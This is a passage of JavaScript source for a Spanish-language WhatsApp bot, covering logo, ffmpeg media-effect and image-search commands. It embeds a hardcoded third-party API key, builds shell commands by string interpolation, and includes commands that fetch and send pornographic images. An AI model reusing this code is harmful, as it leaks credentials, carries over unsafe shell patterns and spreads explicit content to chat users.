  case 'blackpink':
    if (!isRegister) return leoply(baby.only.usrReg)
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/logobp?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break
    
  case 'marvel':
    if (!isRegister) return leoply(baby.only.usrReg)
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  if (!q.includes('|')) return  reply(`*PORFAVOR ESCRIBE BIEN EL FORMATO:* ${prefix + command} *texto1|texto2*\n\n_Separa el texto 1 del texto 2 con el simbolo "|"_`)
  reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${texto1 + texto2}!*`)		
  logo = `https://api.zeks.me/api/marvellogo?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text1=${texto1}&text2=${texto2}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break	
    
  case 'hojas':
    if (!isRegister) return leoply(baby.only.usrReg)
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/leavest?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break
    
  case 'tligth':
    if (!isRegister) return leoply(baby.only.usrReg)
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/tlight?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break
    
  case 'gtext':
    if (!isRegister) return leoply(baby.only.usrReg)
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  if (!q.includes('|')) return  reply(`*PORFAVOR ESCRIBE BIEN EL FORMATO:* ${prefix + command} *texto1|texto2*\n\n_Separa el texto 1 del texto 2 con el simbolo "|"_`)
  reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${texto1 + texto2}!*`)		
  logo = `https://api.zeks.me/api/gtext?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text1=${texto1}&text2=${texto2}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break
  
    

//════════════════════════════════════════ MULTIMEDIA ════════════════════════════════
  //VIDEOS
case 'reversa':
  if (!isRegister) return leoply(baby.only.usrReg)
    if (isBan) return leoply  (baby.only.benned)	
    if (!isRegister) return leoply(baby.only.usrReg)
  if (!isQuotedVideo) return reply('Porfavor etiqueta un video con el comando!')
  reply('*Espera un momento porfavor....*')
  encmediav = JSON.parse(JSON.stringify(choute).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
  mediav = await leo.downloadAndSaveMediaMessage(encmediav)
  ran = getRandom('.mp4')
  exec(`ffmpeg -i ${mediav} -vf reverse -af areverse ${ran}`, (err) => {
  fs.unlinkSync(mediav)
  if (err) return reply(`Error: ${err}`)
  vre = fs.readFileSync(ran)
  leo.sendMessage(from, vre, video, { mimetype: 'video/mp4', quoted: choute, duration: -999999, sendEphemeral: true })
  fs.unlinkSync(ran)
  })
  addFilter(from)
  break
  
  case 'vrapido':	    
  if (!isRegister) return leoply(baby.only.usrReg)
  if (isBan) return leoply  (baby.only.benned)	
  if (!isQuotedVideo) return reply('*ETIQUETA UN VIDEO JUNTO CON EL COMANDO PORFAVOR!!*')
  reply(baby.wait)
  encmediav1 = JSON.parse(JSON.stringify(choute).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
  mediav1 = await leo.downloadAndSaveMediaMessage(encmediav1)
  ran = getRandom('.mp4')
  exec(`ffmpeg -i ${mediav1} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
  fs.unlinkSync(mediav1)
  if (err) return reply(`Error: ${err}`)
  buffer4531 = fs.readFileSync(ran)
  leo.sendMessage(from, buffer4531, video, { mimetype: 'video/mp4', quoted: choute, caption: `*EFECTO DE VIDEO GRACIAS A  ${yo}*`, sendEphemeral: true })
  fs.unlinkSync(ran)
  })
  addFilter(from)
  break
  
  case 'vlento':
    if (!isRegister) return leoply(baby.only.usrReg)
    if (isBan) return leoply  (baby.only.benned)	
  if (!isQuotedVideo) return reply('*ETIQUETA UN VIDEO JUNTO CON EL COMANDO PORFAVOR!!*')
  reply(baby.wait)
  encmediav2 = JSON.parse(JSON.stringify(choute).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
  mediav2 = await leo.downloadAndSaveMediaMessage(encmediav2)
  ran = getRandom('.mp4')
  exec(`ffmpeg -i ${mediav2} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
  fs.unlinkSync(mediav2)
  if (err) return reply(`Err: ${err}`)
  buffer4532 = fs.readFileSync(ran)
  leo.sendMessage(from, buffer4532, video, { mimetype: 'video/mp4', quoted: choute, caption: `*EFECTO DE VIDEO GRACIAS A  ${yo}*`, sendEphemeral: true })
  fs.unlinkSync(ran)
  })
  addFilter(from)
  break
  
  case 'mirror':
    if (!isRegister) return leoply(baby.only.usrReg)
    if (isBan) return leoply  (baby.only.benned)	
  if (!isQuotedVideo) return reply('*ETIQUETA UN VIDEO JUNTO CON EL COMANDO PORFAVOR!!*')
  reply(baby.wait)
  encmediav3 = JSON.parse(JSON.stringify(choute).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
  mediav4 = await leo.downloadAndSaveMediaMessage(encmediav3)
  ran = getRandom('.mp4')
  exec(`ffmpeg -i ${mediav4} -filter:v "split [main][tmp]; [tmp] crop=iw:ih/2:0:0, vflip [flip]; [main][flip] overlay=0:H/2" ${ran}`, (err) => {
  fs.unlinkSync(mediav4)
  if (err) return reply(`Err: ${err}`)
  buffer4533 = fs.readFileSync(ran)
  leo.sendMessage(from, buffer4533, video, { mimetype: 'video/mp4', quoted: choute, caption: `*EFECTO DE VIDEO GRACIAS A ${yo}*`, sendEphemeral: true })
  fs.unlinkSync(ran)
  })
  addFilter(from)
  break
  
  case 'vefecto':
    if (!isRegister) return leoply(baby.only.usrReg)
    if (isBan) return leoply  (baby.only.benned)	
  if (!isQuotedVideo) return reply('*ETIQUETA UN VIDEO JUNTO CON EL COMANDO PORFAVOR!!*')
  reply(baby.wait)
  encmediav5 = JSON.parse(JSON.stringify(choute).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
  mediav5 = await leo.downloadAndSaveMediaMessage(encmediav5)
  ran = getRandom('.mp4')
  exec(`ffmpeg -y -i ${mediav5} -strict experimental -vf hue=s=0 -vcodec mpeg4 -b 2097152 -r 30 ${ran} `, (err) => {
  fs.unlinkSync(mediav5)
  if (err) return reply(`Err: ${err}`)
  buffer4534 = fs.readFileSync(ran)
  leo.sendMessage(from, buffer4534, video, { mimetype: 'video/mp4', quoted: choute, caption: `*EFECTO DE VIDEO GRACIAS A  ${yo}*`, sendEphemeral: true })
  fs.unlinkSync(ran)
  })
  addFilter(from)
  break
  
  case 'sinsonido':
    if (!isRegister) return leoply(baby.only.usrReg)
    if (isBan) return leoply  (baby.only.benned)	
  if (!isQuotedVideo) return reply('*ETIQUETA UN VIDEO JUNTO CON EL COMANDO PORFAVOR!!*')
  reply(baby.wait)
  encmediav6 = JSON.parse(JSON.stringify(choute).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
  mediav6 = await leo.downloadAndSaveMediaMessage(encmediav6)
  ran = getRandom('.mp4')
  exec(`ffmpeg -i ${mediav6} -vcodec copy -an ${ran}`, (err) => {
  fs.unlinkSync(mediav6)
  if (err) return reply(`Err: ${err}`)
  buffer4536 = fs.readFileSync(ran)
  leo.sendMessage(from, buffer4536, video, { mimetype: 'video/mp4', quoted: choute, caption: `*EFECTO DE VIDEO GRACIAS A  ${yo}*`, sendEphemeral: true })
  fs.unlinkSync(ran)
  })
  addFilter(from)
  break
  
  //AUDIO
  case 'imut':
  reply(baby.wait)
  im = JSON.parse(JSON.stringify(choute).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  ut = await leo.downloadAndSaveMediaMessage(im)
  ran = getRandom('.mp3')
  exec(`ffmpeg -i ${ut} -af atempo=3/4,asetrate=44500*4/3 ${ran}`, (err, stderr, stdout) => {
  fs.unlinkSync(ut)
  if (err) return reply('Error!')
  hah = fs.readFileSync(ran)
  leo.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: choute})
  fs.unlinkSync(ran)
  })
  addFilter(from)
  break
  
  case 'hode':
  reply(baby.wait)
  ho = JSON.parse(JSON.stringify(choute).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  de = await leo.downloadAndSaveMediaMessage(ho)
  ran = getRandom('.mp3')
  exec(`ffmpeg -i ${de} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
  fs.unlinkSync(de)
  if (err) return reply('Error!')
  hah = fs.readFileSync(ran)
  leo.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: choute})
  fs.unlinkSync(ran)
  })
  addFilter(from)
  break
  
  case 'trigger':
  reply(baby.wait)
  tri = JSON.parse(JSON.stringify(choute).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  ger = await leo.downloadAndSaveMediaMessage(tri)
  ran = getRandom('.mp3')
  exec(`ffmpeg -i ${ger} -filter_complex "acrusher=level_in=8:level_out=18:bits=8:mode=log:aa=1" ${ran}`, (err, stderr, stdout) => {
  fs.unlinkSync(ger)
  if (err) return reply('Error!')
  hah = fs.readFileSync(ran)
  leo.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: choute})
  fs.unlinkSync(ran)
  })
  addFilter(from)
  break
  
  case 'slow':
  case 'lento':
  reply(baby.wait)
  low = JSON.parse(JSON.stringify(choute).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  slo = await leo.downloadAndSaveMediaMessage(low)
  ran = getRandom('.mp3')
  exec(`ffmpeg -i ${slo} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
  fs.unlinkSync(slo)
  if (err) return reply('Error!')
  hah = fs.readFileSync(ran)
  leo.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration :-999999999999999, ptt:true, quoted: choute})
  fs.unlinkSync(ran)
  })
  addFilter(from)
  break
  
  case 'ardilla':
  reply(baby.wait)
  pai = JSON.parse(JSON.stringify(choute).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  
  tup = await leo.downloadAndSaveMediaMessage(pai)
  ran = getRandom('.mp3')
  exec(`ffmpeg -i ${tup} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
  fs.unlinkSync(tup)
  if (err) return reply('Error!')
  hah = fs.readFileSync(ran)
  leo.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration :-999999999999999, ptt:true, quoted: choute})
  fs.unlinkSync(ran)
  })
  addFilter(from)
  break
  
  case 'grave':
  reply(baby.wait)
  muk = JSON.parse(JSON.stringify(choute).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  gem = await leo.downloadAndSaveMediaMessage(muk)
  ran = getRandom('.mp3')
  exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
  fs.unlinkSync(gem)
  if (err) return reply('Error!')
  hah = fs.readFileSync(ran)
  leo.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration :-999999999999999, ptt:true, quoted: choute})
  fs.unlinkSync(ran)
  })
  addFilter(from)
  break
  
  case 'bass':
  ass = JSON.parse(JSON.stringify(choute).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  reply(baby.wait)
  bas = await leo.downloadAndSaveMediaMessage(ass)
  ran = getRandom('.mp3')
  exec(`ffmpeg -i ${bas} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
  fs.unlinkSync(bas)
  if (err) return reply('Error!')
  hah = fs.readFileSync(ran)
  leo.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration :-999999999999999, ptt:true, quoted: choute})
  fs.unlinkSync(ran)
  })
  addFilter(from)
  break
  
  case 'fantasma':
  if (!isQuotedAudio) return reply('Etiqueta un audio!')	
  reply(baby.wait)
  encmediaa1 = isQuotedAudio ? JSON.parse(JSON.stringify(choute).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : choute
  mediaa1 = await leo.downloadAndSaveMediaMessage(encmediaa1)
  ran = getRandom('.mp3')
  exec(`ffmpeg -i ${mediaa1} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
  fs.unlinkSync(mediaa1)
  if (err) return reply('Error!')
  hah = fs.readFileSync(ran)
  leo.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, duration :-999999999999999, quoted : choute})
  fs.unlinkSync(ran)
  })
  addFilter(from)
  break
  
  case 'robot':
  if (!isQuotedAudio) return reply('Etiqueta un audio!')
  reply(baby.wait)
  encmediar = isQuotedAudio ? JSON.parse(JSON.stringify(choute).replace('quotedM','m')).message.extendedTextMessage.contextInfo : choute
  mediar = await leo.downloadAndSaveMediaMessage(encmediar)
  ran = getRandom('.mp3')
  exec(`ffmpeg -i ${mediar} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
  fs.unlinkSync(mediar)
  if (err) return reply('Error!')
  resa = fs.readFileSync(ran)
  leo.sendMessage(from, resa, audio, { mimetype: "audio/mp4", ptt: true, duration :-999999999999999, quoted: choute})
  fs.unlinkSync(ran)
  })
  addFilter(from)
  break
      
  case 'rapido':
  addFilter(from)
  if (!isQuotedAudio) return reply('Etiqueta un audio!')
  reply(baby.wait)
  encmediiiaa = JSON.parse(JSON.stringify(choute).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
  medi1a = await leo.downloadAndSaveMediaMessage(encmediiiaa)
  ran = getRandom('.mp3')
  exec(`ffmpeg -i ${medi1a} -filter:a "atempo=0.9,asetrate=95100" ${ran}`, (err, stderr, stdout) => {
  fs.unlinkSync(medi1a)
  if (err) return reply('Error!')
  fast = fs.readFileSync(ran)
  leo.sendMessage(from, fast, audio, {
  mimetype: 'audio/mp4', ptt: true, duration :-999999999999999, quoted: choute})
  fs.unlinkSync(ran)
  })
  break


//𝙄𝙈𝘼𝙂𝙀𝙉
case 'imagen':
              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)
              if (args.length < 1) return reply('Que deseas buscar?')
              reply(`Porfavor espera un momento mientras busco imagenes de ` + args.join(' '))
              ggimg = args.join(' ')
              res = LeoGgImg(ggimg, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
              else {
              var gugIm = result
              var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: choute, caption: `*Listo* \n Busqueda Realizada por _${yo}_`})
              }
              }
              addFilter(from)
              break
case 'toimg':
case 'aimg':
                  if (!isRegister) return leoply(baby.only.usrReg)
                  if (isBan) return leoply  (baby.only.benned)	
                          if (!isQuotedSticker) return reply(`Etiqueta un sticker que no sea de movimienyo`)
                          if (choute.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
                          reply(`Este comando solo sirve con stikers estaticos, para convertir un stiker a gif, usa: ${prefix}agif`)
                          } else {
                          var media1 = JSON.parse(JSON.stringify(choute).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                          var media2 = await leo.downloadAndSaveMediaMessage(media1)
                          ran = getRandom('.png')
                          exec(`ffmpeg -i ${media2} ${ran}`, (err) => { 
                          fs.unlinkSync(media2)
                          if (err) {
                          reply(`error\n\n${err}`)
                          fs.unlinkSync(ran)
                          } else {
                          buffer = fs.readFileSync(ran)
                         // leo.sendMessage(from, buffer, MessageType.image, {quoted: choute, caption: `${yo}`})
                          leo.sendMessage(from, buffer, MessageType.image, {quoted: choute, caption: `Sticker Convertdo a Imagen Exitosamente\n𝕭𝖆𝖇𝖞 𝕭𝖊𝖈𝖍𝖔𝖘𝖔   ${yo}`, contextInfo: { mentionedJid: [sender], "forwardingScore": 508, "isForwarded": true, "externalAdReply": 
                          {"title": '[ 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 ]',       
                          "body": 'Subcribete Te Podria Interesar',  
                          "thumbnail": fs.readFileSync('./media/imagen/ytlogo.jpg'),
                          "sourceUrl": 'https://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1'}}});
                          fs.unlinkSync(ran)
                          }
                          })
                          }
                          break

case 'porno':
              if (!isSex) return reply(`${ts}`)
              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)	  
              reply(`Porfavor espera un momento mientras busco imagenes de Porno`)
              ggimg = ['Xxx porno', 'porno', 'porno 4k', 'porno hd']
              res = LeoGgImg(ggimg, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
              else {
              var gugIm = result
              var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: choute, caption: `Te gusta? Si no pide mas\n\n🔥🔥 𝕭𝖔𝖙 𝕭𝖆𝖇𝖞 🔥🔥`})
              }
              }
              addFilter(from)
              break
case 'pack':
              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)	  
              if (!isSex) return reply(`${ts}`)
              reply(`Porfavor espera un momento mientras busco pack para ti`)
              ggimg = 'pack xxx hd'
              res = LeoGgImg(ggimg, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
              else {
              var gugIm = result
              var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: choute, caption: `*Listo* \n Busqueda Realizada por _${yo}_`})
              }
              }
              addFilter(from)
              break

case 'tetas':
case 'teta':
              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)	  
              if (!isSex) return reply(`${ts}`)
              reply(`Porfavor espera un momento mientras busco una teta para ti`)
              ggimg = 'pack xxx hd'
              res = LeoGgImg(ggimg, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
              else {
              var gugIm = result
              var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: choute, caption: `*Listo* \n Busqueda Realizada por _${yo}_`})
              }
              }
              addFilter(from)
              break


case 'culo':
              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)	  
              if (!isSex) return reply(`${ts}`)
              reply(`Porfavor espera un momento mientras busco una foto de un culo para ti`)
              ggimg = 'culonas hd'
              res = LeoGgImg(ggimg, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
              else {
              var gugIm = result
              var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: choute, caption: `*Listo* \n Busqueda Realizada por _${yo}_`})
              }
              }
              addFilter(from)
              break


case 'panocha':
case 'vagina':

              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)	  
              if (!isSex) return reply(`${ts}`)
              reply(`Porfavor espera un momento mientras busco una foto de una panocha para ti`)
              ggimg = 'vagina xxx hd'
              res = LeoGgImg(ggimg, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
              else {
              var gugIm = result
              var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: choute, caption: `*Panocha Para Ti Pajero* _${yo}_`})
              }
              }
              addFilter(from)
              break

case 'pene':
case 'verga':
              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)	  
              if (!isSex) return reply(`${ts}`)
              reply(`Porfavor espera un momento mientras busco una foto de un culo para ti`)
              ggimg = 'pene xxx'
              res = LeoGgImg(ggimg, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
              else {
              var gugIm = result
              var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: choute, caption: `*Listo* \n Busqueda Realizada por _${yo}_`})
              }
              }
              addFilter(from)
              break

case 'imglesbians':
case 'pornolesbian':

              if (!isSex) return reply(`${ts}`)
              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)	  
              reply(`Porfavor espera un momento mientras busco imagenes imagens lesbis para ti`)
              ggimg = 'lesbianas xxx hd'
              res = LeoGgImg(ggimg, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
              else {
              var gugIm = result
              var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: choute, caption: `*Listo* \n Busqueda Realizada por _${yo}_`})
              }
              }
              addFilter(from)
              break

case 'cosplay':
              if (!isSex) return reply(`${ts}`)
              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)

              const cosplay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
              const cosplay18 = cosplay[Math.floor(Math.random() * cosplay.length)]
                imag = fs.readFileSync(`./media/imagen/cosplay/${cosplay18}.jpg`);              
                txtt =`𝕭𝖆𝖇𝖞 𝕭𝖊𝖈𝖍𝖔𝖘𝖔 𝕺𝖋𝖈`
                buttons1 = [{buttonId:`mamaguevo`,buttonText:{displayText: 'Siguiente 😋'},type:1},
                {buttonId:`IM4K`,buttonText:{displayText: '¿Las quieres en 4K?'},type:1}]
                imageMsg = (await leo.prepareMessageMedia((imag), 'imageMessage', {thumbnail: fs.readFileSync(`./media/imagen/fake.jpg`)})).imageMessage
                buttonsMessage = {
                contentText: `${txtt}`,
                footerText: '© Creator 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊', imageMessage: imageMsg,
                buttons: buttons1,
                headerType: 4}
                prep = leo.prepareMessageFromContent(from, { buttonsMessage }, { quoted: choute,  contextInfo: { mentionedJid: [sender,ownerNumber]} })
                leo.relayWAMessage(prep)



               

case 'anime':
                  reply(baby.wait)
                  fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
                  .then(res => res.text())
                  .then(body => {
                  let tod = body.split("\n");
                  let pjr = tod[Math.floor(Math.random() * tod.length)];
                  imageToBase64(pjr)
                  .then((response) => {
                  media =  Buffer.from(response, 'base64');
                  leo.sendMessage(from,media,image,{quoted:choute, caption:'_Espero que te encante_'})})
                  .catch((error) => {
                  console.log(error); 
                  })});
                  break
case 'hetai':
case 'hentai':
case 'etai':
                hentaiz = await axios.get('https://nekos.life/api/v2/img/hentai')
                bufhtz = await getBuffer(hentaiz.data.url)
              //  leo.sendMessage(from, bufhtz, image, {quoted: choute})
                  txtt =`𝕭𝖆𝖇𝖞 𝕭𝖊𝖈𝖍𝖔𝖘𝖔 𝕺𝖋𝖈`
                  buttons1 = [{buttonId:`hetai`,buttonText:{displayText: 'Siguiente 😋'},type:1}]
                  imageMsg = (await leo.prepareMessageMedia((bufhtz), 'imageMessage', {thumbnail: fs.readFileSync(`./media/imagen/fake.jpg`)})).imageMessage
                  buttonsMessage = {
                  contentText: `${txtt}`,
                  footerText: '𝕭𝖆𝖇𝖞 𝕭𝖊𝖈𝖍𝖔𝖘𝖔 𝕺𝖋𝖈\n© Creator 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊', imageMessage: imageMsg,
                  buttons: buttons1,
                  headerType: 4}
                  prep = leo.prepareMessageFromContent(from, { buttonsMessage }, { quoted: choute,  contextInfo: { mentionedJid: [sender,ownerNumber]} })
                  leo.relayWAMessage(prep)
                  .catch(err => {
                    return('Intentalo nuevamente..')})
                  break

case 'hentai1':
case 'hetai1':
              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)	  
              if (!isSex) return reply(`${ts}`)
              reply(`Porfavor espera un momento mientras busco una imagen hetai para ti`)
              ggimg = 'hetai xxx hd'
              res = LeoGgImg(ggimg, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
              else {
              var gugIm = result
              var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: choute, caption: `*Listo* \n Busqueda Realizada por _${yo}_`})
              }
              }
              addFilter(from)
              break

case 'yao':
case 'yaoi':
              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)	  
              if (!isSex) return reply(`${ts}`)
              reply(`Porfavor espera un momento mientras busco una imagen yaoi para ti`)
              ggimg = 'yaoi hard xxx'
              res = LeoGgImg(ggimg, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
              else {
              var gugIm = result
              var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: choute, caption: `*Listo* \n Busqueda Realizada por _${yo}_`})
              }
              }
              addFilter(from)
              break

case 'yuri':
              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)	  
              if (!isSex) return reply(`${ts}`)
              reply(`Porfavor espera un momento mientras busco una imagen de yuri para ti`)
              ggimg = 'imagenes yuri hd'
              res = LeoGgImg(ggimg, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
              else {
              var gugIm = result
              var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: choute, caption: `*Listo* \n Busqueda Realizada por _${yo}_`})
              }
              }
              addFilter(from)
              break

case 'ecchi':
              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)	  
              if (!isSex) return reply(`${ts}`)
              reply(`Porfavor espera un momento mientras busco una imagen de ecchi para ti`)
              ggimg = 'ecchi hd'
              res = LeoGgImg(ggimg, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
              else {
              var gugIm = result
              var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: choute, caption: `*Listo* \n Busqueda Realizada por _${yo}_`})
              }
              }
              addFilter(from)
              break


case 'pantis':
case 'panties':
              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)	  
              if (!isSex) return reply(`${ts}`)
              reply(`Porfavor espera un momento mientras busco unos pantis para ti`)
              ggimg = 'mujeres en pantis xxx hd'
              res = LeoGgImg(ggimg, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
              else {
              var gugIm = result
              var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: choute, caption: `*Listo* \n Busqueda Realizada por _${yo}_`})
              }
              }
              addFilter(from)
              break
            
case 'muslo':
case 'muslos':
              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)	  
              if (!isSex) return reply(`${ts}`)
              reply(`Porfavor espera un momento mientras busco unos muslos para ti`)
              ggimg = 'gotica muslos'
              res = LeoGgImg(ggimg, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
              else {
              var gugIm = result
              var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
